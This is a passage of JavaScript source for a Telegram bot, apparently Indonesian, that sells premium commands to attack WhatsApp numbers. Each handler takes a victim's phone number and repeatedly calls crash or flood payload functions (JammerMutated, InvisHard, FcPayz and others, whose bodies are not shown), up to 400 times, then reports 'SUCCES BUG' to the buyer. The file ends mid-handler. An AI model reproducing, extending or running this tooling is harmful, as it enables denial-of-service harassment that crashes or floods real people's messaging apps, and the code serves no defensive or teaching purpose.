bot.onText(/\/Xexplantion(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    const randomImage = getRandomImage();

    // 1. Cek Akses Premium
      if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, { // Pastikan chatId (tanpa underscore)
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      }); // Tutup kurung ini sangat penting
    }


    // 2. Validasi Input Target
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Xexplantion 628xxxx");
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const date = getCurrentDate(); // Mengikuti gaya ForceInvinity

    // 3. Cek Cooldown
    const cooldown = checkCooldown(senderId);
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`);
    }

    // 4. Cek Ketersediaan Session WhatsApp
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu"
      );
    }

    // 5. Kirim Notifikasi Awal (Success Layout)
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/eg5zg4.jpg",
      {
        caption: `<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xexplantion
▹ Status : Processed
▹ Date : ${date}
</blockquote>
<i>Note: Jeda 20 menit agar sender tidak overheat</i>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    // 6. Eksekusi Loop Bug di Background
    setTimeout(async () => {
      try {
        console.log("\x1b[32m[PROCESS MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        
        for (let i = 0; i < 400; i++) {
          await JammerMutated(target);
          await JammerZombieX(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          
          // Gunakan fungsi sleep jika tersedia, atau Promise
          await new Promise((resolve) => setTimeout(resolve, 1000));
          
          if (i % 50 === 0) { // Log setiap 50 loop agar tidak spam console
             console.log(`[RidzzOffc] Xexplantion: ${formattedNumber} (${i}/400)`);
          }
        }
        
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Bug Xexplantion selesai dikirim ke ${formattedNumber}`);

        // Update caption setelah selesai (opsional)
        await bot.editMessageCaption(`<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xexplantion
▹ Status : Success
▹ Date : ${date}
</blockquote>`, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]
            ]
          }
        });

      } catch (err) {
        console.log("Xexplantion Loop Error:", err);
      }
    }, 100);

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    console.log("Xexplantion ERROR:", error);
  }
});


bot.onText(/\/Xorion(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    const randomImage = getRandomImage();

    // 1. Cek Akses Premium
      if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, { // Pastikan chatId (tanpa underscore)
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      }); // Tutup kurung ini sangat penting
    }


    // 2. Validasi Input Target
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Xorion 628xxxx");
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const date = getCurrentDate(); // Mengikuti gaya ForceInvinity

    // 3. Cek Cooldown
    const cooldown = checkCooldown(senderId);
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`);
    }

    // 4. Cek Ketersediaan Session WhatsApp
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu"
      );
    }

    // 5. Kirim Notifikasi Awal (Success Layout)
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/eg5zg4.jpg",
      {
        caption: `<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xorion
▹ Status : Processed
▹ Date : ${date}
</blockquote>
<i>Note: Jeda 20 menit agar sender tidak overheat</i>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    // 6. Eksekusi Loop Bug di Background
    setTimeout(async () => {
      try {
        console.log("\x1b[32m[PROCESS MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        
        for (let i = 0; i < 400; i++) {
          await JammerMutated(target);
          await JammerZombieX(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          
          // Gunakan fungsi sleep jika tersedia, atau Promise
          await new Promise((resolve) => setTimeout(resolve, 1000));
          
          if (i % 50 === 0) { // Log setiap 50 loop agar tidak spam console
             console.log(`[RidzzOffc] Xorion: ${formattedNumber} (${i}/400)`);
          }
        }
        
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Bug Xorion selesai dikirim ke ${formattedNumber}`);

        // Update caption setelah selesai (opsional)
        await bot.editMessageCaption(`<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xorion
▹ Status : Success
▹ Date : ${date}
</blockquote>`, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]
            ]
          }
        });

      } catch (err) {
        console.log("Xorion Loop Error:", err);
      }
    }, 100);

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    console.log("Xorion ERROR:", error);
  }
});


bot.onText(/\/Xsnow(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Xsnow 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendMessage(chatId, `
<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xsnow
▹ Status : Success
▹ Date : ${date}
</blockquote>
`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    })

    setTimeout(async () => {
      try {

        for (let i = 0; i < 1; i++) {
          await FcPayz(target)
          await sleep(500)
        }

        console.log(`[SUCCESS] Xsnow ${formattedNumber}`)

      } catch (err) {
        console.log("Xsnow error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Xsnow ERROR:", err)
  }
});

bot.onText(/\/Xdeaht(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Xdeaht 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendMessage(chatId, `
<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xdeaht
▹ Status : Success
▹ Date : ${date}
</blockquote>
`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    })

    setTimeout(async () => {
      try {

        for (let i = 0; i < 1; i++) {
          await FcPayz(target)
          await sleep(500)
        }

        console.log(`[SUCCESS] Xdeaht ${formattedNumber}`)

      } catch (err) {
        console.log("Xdeaht error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Xdeaht ERROR:", err)
  }
});

bot.onText(/\/Cover(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Cover 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendMessage(chatId, `
<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Cover
▹ Status : Success
▹ Date : ${date}
</blockquote>
`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    })

    setTimeout(async () => {
      try {

        for (let i = 0; i < 1; i++) {
          await FcPayz(target)
          await sleep(500)
        }

        console.log(`[SUCCESS] Cover ${formattedNumber}`)

      } catch (err) {
        console.log("Cover error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Cover ERROR:", err)
  }
});

bot.onText(/\/Sexven(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Sexven 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendMessage(chatId, `
<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Sexven
▹ Status : Success
▹ Date : ${date}
</blockquote>
`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    })

    setTimeout(async () => {
      try {

        for (let i = 0; i < 1; i++) {
          await FcPayz(target)
          await sleep(500)
        }

        console.log(`[SUCCESS] Sexven ${formattedNumber}`)

      } catch (err) {
        console.log("Sexven error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Sexven ERROR:", err)
  }
});

bot.onText(/\/Xexite(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Xexite 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendMessage(chatId, `
<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xexite
▹ Status : Success
▹ Date : ${date}
</blockquote>
`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    })

    setTimeout(async () => {
      try {

        for (let i = 0; i < 1; i++) {
          await FcPayz(target)
          await sleep(500)
        }

        console.log(`[SUCCESS] Xexite ${formattedNumber}`)

      } catch (err) {
        console.log("Xexite error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Xexite ERROR:", err)
  }
});

bot.onText(/\/Vortex(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User"

    const randomImage = getRandomImage()

    // cek premium
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM

User : ${username}
Status : Premium Required

Hubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Vortex 628xxxx")
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`
    const date = getCurrentDate()

    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`)
    }

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu")
    }

    await bot.sendMessage(chatId, `
<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Vortex
▹ Status : Success
▹ Date : ${date}
</blockquote>
`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    })

    setTimeout(async () => {
      try {

        for (let i = 0; i < 1; i++) {
          await FcPayz(target)
          await sleep(500)
        }

        console.log(`[SUCCESS] Vortex ${formattedNumber}`)

      } catch (err) {
        console.log("Vortex error:", err)
      }
    }, 100)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ Error: ${err.message}`)
    console.log("Vortex ERROR:", err)
  }
});

bot.onText(/\/Xblank(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    const randomImage = getRandomImage();

    // 1. Cek Akses Premium
      if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, { // Pastikan chatId (tanpa underscore)
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      }); // Tutup kurung ini sangat penting
    }


    // 2. Validasi Input Target
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Xblank 628xxxx");
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const date = getCurrentDate(); // Mengikuti gaya ForceInvinity

    // 3. Cek Cooldown
    const cooldown = checkCooldown(senderId);
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`);
    }

    // 4. Cek Ketersediaan Session WhatsApp
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu"
      );
    }

    // 5. Kirim Notifikasi Awal (Success Layout)
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/eg5zg4.jpg",
      {
        caption: `<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xblank
▹ Status : Processed
▹ Date : ${date}
</blockquote>
<i>Note: Jeda 20 menit agar sender tidak overheat</i>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    // 6. Eksekusi Loop Bug di Background
    setTimeout(async () => {
      try {
        console.log("\x1b[32m[PROCESS MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        
        for (let i = 0; i < 400; i++) {
          await JammerMutated(target);
          await JammerZombieX(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          
          // Gunakan fungsi sleep jika tersedia, atau Promise
          await new Promise((resolve) => setTimeout(resolve, 1000));
          
          if (i % 50 === 0) { // Log setiap 50 loop agar tidak spam console
             console.log(`[RidzzOffc] Xblank: ${formattedNumber} (${i}/400)`);
          }
        }
        
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Bug Xblank selesai dikirim ke ${formattedNumber}`);

        // Update caption setelah selesai (opsional)
        await bot.editMessageCaption(`<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xblank
▹ Status : Success
▹ Date : ${date}
</blockquote>`, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]
            ]
          }
        });

      } catch (err) {
        console.log("Xblank Loop Error:", err);
      }
    }, 100);

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    console.log("Xblank ERROR:", error);
  }
});

bot.onText(/\/Xyou(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    const randomImage = getRandomImage();

    // 1. Cek Akses Premium
      if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, { // Pastikan chatId (tanpa underscore)
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      }); // Tutup kurung ini sangat penting
    }


    // 2. Validasi Input Target
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Xyou 628xxxx");
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const date = getCurrentDate(); // Mengikuti gaya ForceInvinity

    // 3. Cek Cooldown
    const cooldown = checkCooldown(senderId);
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`);
    }

    // 4. Cek Ketersediaan Session WhatsApp
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu"
      );
    }

    // 5. Kirim Notifikasi Awal (Success Layout)
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/eg5zg4.jpg",
      {
        caption: `<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xyou
▹ Status : Processed
▹ Date : ${date}
</blockquote>
<i>Note: Jeda 20 menit agar sender tidak overheat</i>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    // 6. Eksekusi Loop Bug di Background
    setTimeout(async () => {
      try {
        console.log("\x1b[32m[PROCESS MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        
        for (let i = 0; i < 400; i++) {
          await JammerMutated(target);
          await JammerZombieX(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          
          // Gunakan fungsi sleep jika tersedia, atau Promise
          await new Promise((resolve) => setTimeout(resolve, 1000));
          
          if (i % 50 === 0) { // Log setiap 50 loop agar tidak spam console
             console.log(`[RidzzOffc] Xyou: ${formattedNumber} (${i}/400)`);
          }
        }
        
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Bug Xyou selesai dikirim ke ${formattedNumber}`);

        // Update caption setelah selesai (opsional)
        await bot.editMessageCaption(`<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xyou
▹ Status : Success
▹ Date : ${date}
</blockquote>`, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]
            ]
          }
        });

      } catch (err) {
        console.log("Xyou Loop Error:", err);
      }
    }, 100);

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    console.log("Xyou ERROR:", error);
  }
});

bot.onText(/\/Xsow(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    const randomImage = getRandomImage();

    // 1. Cek Akses Premium
      if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, { // Pastikan chatId (tanpa underscore)
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      }); // Tutup kurung ini sangat penting
    }


    // 2. Validasi Input Target
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Xsow 628xxxx");
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const date = getCurrentDate(); // Mengikuti gaya ForceInvinity

